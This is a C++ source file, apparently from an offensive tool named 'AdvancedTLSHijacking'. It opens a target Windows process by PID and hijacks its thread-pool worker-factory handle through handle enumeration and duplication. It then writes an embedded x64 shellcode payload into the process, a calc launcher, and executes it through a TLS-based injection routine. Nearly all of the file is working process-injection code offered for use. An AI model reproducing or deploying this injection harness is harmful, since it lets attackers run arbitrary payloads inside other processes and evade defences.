#include "../include/main.hpp"


byte* GetRemoteModuleBase(HANDLE hProcess, wchar_t* moduleName)
{
    MODULEENTRY32W moduleEntry = { 0 };
    HANDLE hSnapshot = nullptr;

    //
    // Create module snapshot and enumerate loaded DLLs
    //

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetProcessId(hProcess));
    if (!hSnapshot) {
        return nullptr;
    }

    moduleEntry.dwSize = sizeof(MODULEENTRY32W);

    if (!Module32FirstW(hSnapshot, &moduleEntry)) {
        WIN32_ERR(Module32FirstW);
        return nullptr;
    }

    do {
        if (wcscmp(moduleEntry.szModule, moduleName) == 0) {
            CloseHandle(hSnapshot);
            return moduleEntry.modBaseAddr;
        }

    } while (Module32NextW(hSnapshot, &moduleEntry));

    CloseHandle(hSnapshot);
    return nullptr;
}

HANDLE HijackProcessHandle(_In_ HANDLE targetProcess, _In_ const wchar_t* handleTypeName, _In_ uint32_t desiredAccess)
{
    fnNtQueryInformationProcess pQueryProcInfo = nullptr;
    fnNtQueryObject pQueryObject = nullptr;

    PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessSnapshotInfo = nullptr;
    PPUBLIC_OBJECT_TYPE_INFORMATION objectInfo = nullptr;

    uint32_t totalHandles         = NULL;
    uint32_t handleInfoSize       = NULL;
    NTSTATUS status               = 0x00;
    HANDLE duplicatedHandle       = NULL;
    bool handleFound              = false;
    uint32_t objectTypeReturnLen  = NULL;

    // NtQueryInformationProcess
    pQueryProcInfo = reinterpret_cast<fnNtQueryInformationProcess>(
        GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryInformationProcess"));

    // NtQueryObject
    pQueryObject = reinterpret_cast<fnNtQueryObject>(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtQueryObject"));

    if (pQueryProcInfo == nullptr || pQueryObject == nullptr) {
        duplicatedHandle = INVALID_HANDLE_VALUE;
        goto FUNC_END;
    }

    std::wcout << L"{+} Attempting to hijack handle of type: " << handleTypeName << std::endl;

    if (!GetProcessHandleCount(targetProcess, (PDWORD)&totalHandles)) {
        WIN32_ERR(GetProcessHandleCount);
        duplicatedHandle = INVALID_HANDLE_VALUE;
        goto FUNC_END;
    }

    handleInfoSize = sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION) + ((totalHandles + 15) * sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO));

    pProcessSnapshotInfo = (decltype(pProcessSnapshotInfo))(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleInfoSize));
    
    if (pProcessSnapshotInfo == nullptr) {
        WIN32_ERR(Process Snapshot Info Heap Alloc);
        duplicatedHandle = INVALID_HANDLE_VALUE;
    }

    status = pQueryProcInfo(targetProcess, (PROCESSINFOCLASS)51, pProcessSnapshotInfo, handleInfoSize, NULL);

    if (status != ERROR_SUCCESS) {
        NTAPI_ERR(NtQueryInformationProcess, status);
        duplicatedHandle = INVALID_HANDLE_VALUE;
        goto FUNC_END;
    }

    for (size_t i = 0; i < pProcessSnapshotInfo->NumberOfHandles; i++) {
        if (!DuplicateHandle(targetProcess, pProcessSnapshotInfo->Handles[i].HandleValue, GetCurrentProcess(),
                &duplicatedHandle, desiredAccess, FALSE, NULL)) {
            continue;
        }

        pQueryObject(duplicatedHandle, ObjectTypeInformation, NULL, NULL,
            (PULONG)&objectTypeReturnLen); // retrieve correct buffer size first

        objectInfo = static_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(
            HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, objectTypeReturnLen));
        if (objectInfo == nullptr) {
            break;
        }

        status = pQueryObject(duplicatedHandle, ObjectTypeInformation, objectInfo, objectTypeReturnLen, NULL);

        if (status != ERROR_SUCCESS) {
            NTAPI_ERR(NtQueryObject, status);
            break;
        }

        if (wcsncmp(handleTypeName, objectInfo->TypeName.Buffer, wcslen(handleTypeName)) == 0) {
            std::wcout << L"{!} found \"" << objectInfo->TypeName.Buffer << L"\" handle! Hijacking successful."
                       << std::endl;
            handleFound = true;
            break;
        }

        HeapFree(GetProcessHeap(), 0, objectInfo);
    }

    if (!handleFound) {
        duplicatedHandle = INVALID_HANDLE_VALUE;
    }

FUNC_END:

    if (pProcessSnapshotInfo) {
        HeapFree(GetProcessHeap(), 0, pProcessSnapshotInfo);
    }

    if (objectInfo) {
        HeapFree(GetProcessHeap(), 0, objectInfo);
    }

    return duplicatedHandle;
}

// calc
unsigned char Shellcode[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31,
    0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48,
    0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1,
    0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01,
    0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18,
    0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6,
    0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C,
    0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41,
    0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58,
    0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0,
    0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06,
    0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF,
    0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00

};

int wmain(int argc, wchar_t** argv)
{
    if (argc != 2) {
        std::cout << "[USEAGE:] specify target process PID. Example: \"AdvancedTLSHijacking.exe 3341\"" << std::endl;
        return 0;
    }

    uint32_t PID = 0;
    try {
        PID = std::stoul(argv[1]);
    }
    catch (...) {
        std::wcerr << L"Invalid PID: " << argv[1] << std::endl;
        std::wcerr << L"Exiting..." << std::endl;
        return -1;
    }
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == nullptr) {
        WIN32_ERR(OpenProcess);
        return -1;
    }
    
    byte* moduleBase = GetRemoteModuleBase(hProcess, const_cast<wchar_t*>(L"KERNELBASE.dll"));
    if (moduleBase == nullptr) {
        return -1;
    }

    HANDLE hWorkerFactory = HijackProcessHandle(hProcess, L"TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS);
    if (hWorkerFactory == INVALID_HANDLE_VALUE) {
        return -1;
    }

    void* remotePayload = nullptr;
    if (!WritePayloadIntoProcess(hProcess, Shellcode, sizeof(Shellcode), &remotePayload)) {
        return -1;
    }

    if (!AdvancedTlsInjection(hProcess, moduleBase, remotePayload, hWorkerFactory)) {
        return -1;
    }

    std::cout << "{+} Injection successful." << std::endl;
    return 0;
}
